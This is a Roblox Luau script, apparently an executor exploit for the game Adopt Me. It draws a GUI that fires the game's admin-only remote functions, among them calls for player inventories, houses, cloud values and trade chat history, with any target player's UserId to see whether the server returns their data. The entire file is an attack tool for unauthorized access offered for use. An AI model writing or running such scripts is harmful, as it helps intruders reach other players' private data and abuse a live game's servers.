-- Adopt Me Admin API Interrogator
-- Runtime: Roblox Luau (Delta Executor / Level 8+)
-- absolute olliE

task.spawn(function()
    pcall(function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local LocalPlayer = Players.LocalPlayer
        local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

        -- UI Setup
        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "olliE_Interrogator"
        screenGui.DisplayOrder = 10000
        screenGui.Parent = PlayerGui

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 400, 0, 350)
        frame.Position = UDim2.new(0.5, -200, 0.5, -175)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        frame.BorderSizePixel = 0
        frame.Parent = screenGui

        local titleLabel = Instance.new("TextLabel")
        titleLabel.Size = UDim2.new(1, 0, 0, 30)
        titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        titleLabel.Text = "olliE Admin API Interrogator"
        titleLabel.Font = Enum.Font.GothamBold
        titleLabel.TextSize = 16
        titleLabel.Parent = frame

        local userIdInput = Instance.new("TextBox")
        userIdInput.Size = UDim2.new(0.9, 0, 0, 30)
        userIdInput.Position = UDim2.new(0.05, 0, 0.1, 0)
        userIdInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        userIdInput.TextColor3 = Color3.fromRGB(255, 255, 255)
        userIdInput.PlaceholderText = "Target UserId (or leave blank for self)"
        userIdInput.Font = Enum.Font.Gotham
        userIdInput.TextSize = 12
        userIdInput.Parent = frame

        local outputLabel = Instance.new("TextLabel")
        outputLabel.Size = UDim2.new(0.9, 0, 0, 120)
        outputLabel.Position = UDim2.new(0.05, 0, 0.55, 0)
        outputLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        outputLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
        outputLabel.Text = "Waiting for input..."
        outputLabel.Font = Enum.Font.Code
        outputLabel.TextSize = 10
        outputLabel.TextWrapped = true
        outputLabel.TextXAlignment = Enum.TextXAlignment.Left
        outputLabel.Parent = frame

        -- The Target Remotes
        local targets = {
            "AdminAPI/GetCmdrAdminAbuseHouses",
            "AdminAPI/GetCmdrPlayerHouses",
            "AdminAPI/GetCmdrPlayerInventoryItems",
            "AdminAPI/GetCmdrCloudValueSchemas",
            "AdminAPI/GetCmdrCloudValue",
            "AdminAPI/GetCmdrDynamicNarrativeScenes",
            "AdminAPI/RequestTradeChatHistory",
            "AdminAPI/GetCmdrPlayerFurnitureKinds"
        }

        local startY = 0.22
        for i, name in ipairs(targets) do
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0.9, 0, 0, 25)
            btn.Position = UDim2.new(0.05, 0, startY, 0)
            btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
            btn.Text = "Fire: " .. name
            btn.Font = Enum.Font.Gotham
            btn.TextSize = 10
            btn.Parent = frame

            btn.MouseButton1Click:Connect(function()
                pcall(function()
                    outputLabel.Text = "Firing " .. name .. "..."
                    local remote = ReplicatedStorage:FindFirstChild(name, true)
                    
                    if remote and remote:IsA("RemoteFunction") then
                        local targetId = tonumber(userIdInput.Text) or LocalPlayer.UserId
                        -- Fire with the target UserId
                        local response = remote:InvokeServer(targetId)
                        
                        if response then
                            local str = typeof(response)
                            if type(response) == "table" then
                                str = "Table with " .. #response .. " items"
                            end
                            outputLabel.Text = "SUCCESS:\nType: " .. str .. "\nData: " .. tostring(response)
                        else
                            outputLabel.Text = "BLOCKED:\nServer returned nil/empty.\nYou are not on the backend admin database."
                        end
                    else
                        outputLabel.Text = "ERROR:\nRemote not found in ReplicatedStorage."
                    end
                end)
            end)

            startY = startY + 0.06
        end
    end)
end)